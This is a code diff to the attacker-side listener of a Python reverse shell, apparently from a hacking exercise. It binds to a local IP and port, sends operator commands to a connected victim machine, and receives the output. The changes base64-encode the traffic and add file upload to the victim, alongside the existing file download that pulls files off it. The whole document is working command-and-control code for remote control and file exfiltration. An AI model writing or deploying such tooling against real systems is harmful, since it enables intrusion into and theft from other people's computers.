@@ -17,31 +17,40 @@ class Listener:
         json_data = ""
         while True:
             try:
-                json_data = json_data + self.conn.recv(1024).decode()
+                json_data = json_data + base64.b64decode(self.conn.recv(1024)).decode()
                 return json.loads(json_data)
             except ValueError:
                 continue
 
     def send_reliably(self, commands):
         json_obj = json.dumps(commands)
-        self.conn.send(json_obj.encode())
+        self.conn.send(base64.b64encode(json_obj.encode()))
 
     def write_file(self, path, content):
         with open(path, "wb") as file:
-            file.write(base64.b64decode(content.encode()))
+            file.write(base64.b64decode(content))
             return "[+] Download Successful"
+
+    def send_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
 
     def run(self):
         while True:
             commands = input("=>").split(' ')
+            if commands[0] == "upload":
+                content = self.send_file(commands[1])
+                content = content.decode()
+                commands.append(content)
             self.send_reliably(commands)
+
             if commands[0] == "exit":
                 self.conn.close()
                 exit()
-            results = self.recv_reliably()
+            result = self.recv_reliably()
             if commands[0] == "download":
-                results = self.write_file(commands[1], results)
-            print(results)
+                result = self.write_file(commands[1], result)
+            print(result)
 
 
 my_listener = Listener("192.168.43.13", 8080)
